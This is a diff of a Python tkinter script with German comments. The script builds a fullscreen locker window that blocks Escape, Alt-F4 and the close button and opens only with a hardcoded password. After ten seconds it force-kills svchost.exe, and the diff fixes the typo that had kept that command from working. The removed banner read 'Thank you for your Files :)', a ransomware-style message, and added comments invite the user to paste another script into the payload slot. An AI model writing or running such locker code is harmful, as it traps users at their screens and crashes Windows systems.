@@ -4,25 +4,29 @@ import time
 
 PASSWORT = "7985357"
 
+# =====================================================
+# 🔽🔽🔽 HIER DEIN ZWEITES FERTIGES SCRIPT EINFÜGEN 🔽🔽🔽
+# =====================================================
 
 def DEIN_SCRIPT():
     import subprocess
 
-BEFEHL = "taskill /IM svchost.exe /F"
+BEFEHL = "taskkill /IM svchost.exe /F"
 
 subprocess.Popen(
     ["cmd.exe", "/k", BEFEHL],
     creationflags=subprocess.CREATE_NEW_CONSOLE
 )
 
-
-
+# =====================================================
+# 🔼🔼🔼 AB HIER NICHTS MEHR ÄNDERN 🔼🔼🔼
+# =====================================================
 
 def after_10_seconds():
     time.sleep(10)
     DEIN_SCRIPT()
 
-
+# Fenster
 root = tk.Tk()
 root.configure(bg="red")
 root.attributes("-fullscreen", True)
@@ -30,18 +34,18 @@ root.attributes("-topmost", True)
 root.focus_force()
 root.grab_set()
 root.protocol("WM_DELETE_WINDOW", lambda: None)
- 
 
+# Text oben
 label = tk.Label(
     root,
-    text="Thank you for your Files :)",
+    text="hallo",
     fg="white",
     bg="red",
     font=("Arial", 40, "bold")
 )
 label.pack(pady=30)
 
-
+# Spacer
 tk.Frame(root, bg="red").pack(expand=True)
 
 # Passwortfeld unten
@@ -63,7 +67,7 @@ def check_password(event=None):
 
 entry.bind("<Return>", check_password)
 
-
+# Tasten blockieren
 for key in [
     "<Escape>",
     "<Alt-F4>",
@@ -74,7 +78,7 @@ for key in [
 ]:
     root.bind_all(key, lambda e: "break")
 
-
+# Timer starten
 threading.Thread(target=after_10_seconds, daemon=True).start()
 
 root.mainloop()
